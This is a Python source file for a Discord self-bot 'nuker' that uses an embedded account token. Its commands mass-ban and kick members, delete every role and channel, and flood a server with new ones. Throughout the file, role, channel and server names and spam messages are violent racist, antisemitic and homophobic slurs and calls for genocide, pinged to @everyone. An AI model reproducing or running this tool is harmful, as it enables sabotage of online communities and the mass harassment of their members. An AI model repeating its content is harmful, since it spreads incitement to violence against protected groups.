version = 3.1

import discord
import termcolor
import os
import colorama
import webbrowser
from discord.ext import commands
from discord.ext import tasks
from termcolor import colored
from colorama import Fore, init

############################################################################
#              I hate negros. That's it. Change your token or something.
token = "Nzg3MTY1OTI3NTE4NjM0MDA1.X9RDWw.LXFO1wcfJ-DXDq61xDaanuq57Cs"
prefix = ";"
#############################################################################

os.system("clear")
print(f"{Fore.RED}Loading...")

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")


@bot.event
async def on_connect():
    os.system("clear")
    print(rf"""{Fore.RED}

                        ░█████╗░██████╗░██╗░░██╗░█████╗░███╗░░██╗░██████╗░█████╗░░██████╗
                        ██╔══██╗██╔══██╗██║░██╔╝██╔══██╗████╗░██║██╔════╝██╔══██╗██╔════╝
                        ███████║██████╔╝█████═╝░███████║██╔██╗██║╚█████╗░███████║╚█████╗░
                        ██╔══██║██╔══██╗██╔═██╗░██╔══██║██║╚████║░╚═══██╗██╔══██║░╚═══██╗
                        ██║░░██║██║░░██║██║░╚██╗██║░░██║██║░╚███║██████╔╝██║░░██║██████╔╝
                        ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═════╝░
                                                                                          
                                                                                          
                                                                                          
                                                            {Fore.RED}ARKANSAS
    """)
    print(f"{Fore.RED}                       ARKANSAS Version | {version}")
    print(
        f"{Fore.BLUE}                      Logged in as: | {bot.user.name}#{bot.user.discriminator}"
    )
    print(f"{Fore.BLUE}                      User ID | {bot.user.id}")
    print(f"{Fore.BLUE}                      Prefix | {prefix}")
    print(f"{Fore.BLUE}{prefix}ban - Bans all server members.")
    print(f"{Fore.BLUE}{prefix}kick - Kicks all server members.")
    print(f"{Fore.BLUE}{prefix}rename [name] - Renames all server members to [name].")
    print(f"{Fore.BLUE}{prefix}role create - Creates 50 roles.")
    print(f"{Fore.BLUE}{prefix}role delete - Deletes all server roles.")
    print(f"{Fore.BLUE}{prefix}channel create - Creates 50 channels.")
    print(f"{Fore.BLUE}{prefix}channel delete - Deletes all server channels.")
    print(f"{Fore.BLUE}{prefix}GLORY_TO_ARKANSAS/nuke - Nukes the server.")
    print(f"{Fore.BLUE}{prefix}shutdown/off/stop/end - Exits.")
    print("")




    #Mass ban
    @bot.command()
    async def ban(ctx):
        await ctx.message.delete()
        print(f"{Fore.BLUE}Initiating...")
        print(f"{Fore.BLUE}Please wait...")
        for member in ctx.guild.members:
            try:
                await member.ban()
                print("Banned " + str(member))
            except:
                print("Unable to ban " + str(member) + ", you likely don't have permission.")
                pass

    #Mass kick
    @bot.command()
    async def kick(ctx):
        await ctx.message.delete()
        print(f"{Fore.BLUE}Initiating...")
        print(f"{Fore.BLUE}Please wait...")
        print(f"{Fore.RED}Kicking has begun.")
        for member in ctx.guild.members:
            try:
                await member.kick()
                print("Kicked " + str(member))
            except:
                print("Unable to kick " + str(member) + ", you likely don't have permission.")
                pass

    #Role deletion/Mass role creation
    @bot.command()
    async def role(ctx, choice):
        if choice == "create":
            await ctx.message.delete()
            print(f"{Fore.BLUE}Initiating...")
            print(f"{Fore.BLUE}Please wait...")
            print("Role creation has begun. Enjoy.")
            for i in range(1, 50):
                try:
                    await ctx.guild.create_role(
                        name=f"I have killed {i} faggots")
                except:
                    print("Unable to make new channels, you likely don't have permission.")
        elif choice == "delete":
            await ctx.message.delete()
            print(f"{Fore.BLUE}Removing roles...")
            print(f"{Fore.BLUE}Please wait...")
            roles = ctx.guild.roles
            roles.pop(0)
            for role in roles:
                try:
                    await role.delete()
                    print("Deleted " + str(role) + ".")
                except:
                    print("Unable to delete " + str(role) + ", you likely don't have permission.")
                    pass
        else:
            await print("Not a valid option.")

    #Mass rename
    @bot.command()
    async def rename(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print(f"{user.name} has been renamed to {rename_to}.")
            except:
                print(f"{user.name} has not been renamed to {rename_to}, you likely don't have permission.")

    #Channel deletion/Mass creation
    @bot.command()
    async def channel(ctx, choice):
        if choice == "create":
            await ctx.message.delete()
            print(f"{Fore.BLUE}Creating channels...")
            print(f"{Fore.BLUE}Please wait....")
            try:
                for i in range(1, 50):
                    await ctx.guild.create_text_channel(
                        name=f"{i} faggots burned")
                    await ctx.guild.create_voice_channel(
                        name=f"{i} kikes gassed")
                    await ctx.guild.create_category(
                        name=f"{i} niggers hung")
            except:
                print("Unable to create channels, you likely don't have permission.")
        elif choice == "delete":
            await ctx.message.delete()
            print(f"{Fore.BLUE}Deleting channels...")
            print(f"{Fore.BLUE}Please wait...")
            print("Channel deletion has begun.")
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    print("Deleted " + str(channel) + ".")
                except:
                    print(f"{Fore.RED}Unable to delete " + str(channel) +
                          ", you likely don't have permission.")
                    pass
            print("Finished deleting channels.")
        else:
            print(f"{Fore.RED}Not a valid option.")

    #End
    @bot.command(aliases=["shutdown", "off", "stop"])
    async def end(ctx):
        await ctx.message.delete()
        os.system("clear -x")  #change to "cls" if you're using windows
        print(f"{Fore.RED}Exiting the console...")
        await bot.logout()

    #Nuke
    @bot.command(aliases=["GLORY_TO_ARKANSAS"], )
    async def nuke(ctx):
        await ctx.message.delete()
        print(f"{Fore.RED}Here we go.")
        print("")
        print(f"{Fore.RED}Banning has begun.")
        print("")
        
        try:
            for member in ctx.guild.members:
                await member.ban()
                print("Banned " + str(member) + ".")
        except:
            print("Unable to ban " + str(member) + ", you likely don't have permission.")
            pass
            #Deletes roles
        print("Banning finished.")

        print(f"{Fore.RED}Role deletion has begun.")
        print("")
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            try:
                await role.delete()
                print("Deleted " + str(role) + ".")
            except:
                print("Unable to delete " + str(role) +
                      ", you likely don't have permission.")
                pass
        print(f"{Fore.GREEN}Role deletion has finished.\n")
        print(f"{Fore.RED}Mass role and channel creation has begun.")
        print("")

        #Deletes channels

        print(f"{Fore.RED}Channel deletion has begun.")
        print("")
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print("Deleted " + str(channel) + ".")
            except:
                pass
                print("Unable to delete " + str(channel) +", you likely don't have permission.")
        print(f"{Fore.GREEN}Channel deletion has finished.")
        print("")

        #Creates channels

        for i in range(50):
            try:
                await ctx.guild.create_role(name=f"FUCK YOU NIGGER")
                await ctx.guild.create_text_channel(
                    name=f"GET FUCKED FAGGOT")
                await ctx.guild.create_voice_channel(
                    name=f"GET FUCKED BITCH")
                await ctx.guild.create_category(name=f"GET FUCKED KIKE")
            except:
                print("Unable to create roles, you likely don't have permission.")
        print("Mass channel creation has finished.")

        try:
            await ctx.guild.edit(name="KILL ALL NIGGERS")
            with open('NSDAP.png', 'rb') as f:
                icon = f.read()
                await ctx.guild.edit(icon=icon)
        except:
            print("Unable to edit server.")
        
        for x in range(50):
          for channel in list(ctx.message.guild.channels):
            try:
              await channel.send("@everyone GAS THE KIKES; RACE WAR NOW")
            except Exception as e:
              print(e)




        print("Nuke complete.")


    
    @bot.command(aliases=["commands"], )
    async def help(ctx):
        await ctx.message.delete()
        print(f"{Fore.BLUE}{prefix}ban - Bans all server members.")
        print(f"{Fore.BLUE}{prefix}kick - Kicks all server members.")
        print(f"{Fore.BLUE}{prefix}rename [name] - Renames all server members to [name].")
        print(f"{Fore.BLUE}{prefix}role create - Creates 50 roles.")
        print(f"{Fore.BLUE}{prefix}role delete - Deletes all server roles.")
        print(f"{Fore.BLUE}{prefix}channel create - Creates 50 channels.")
        print(f"{Fore.BLUE}{prefix}channel delete - Deletes all server channels.")
        print(f"{Fore.BLUE}{prefix}GLORY_TO_ARKANSAS/nuke - Nukes the server.")
        print(f"{Fore.BLUE}{prefix}shutdown/off/stop/end - Exits.")
        print("")


bot.run(token, bot=False)

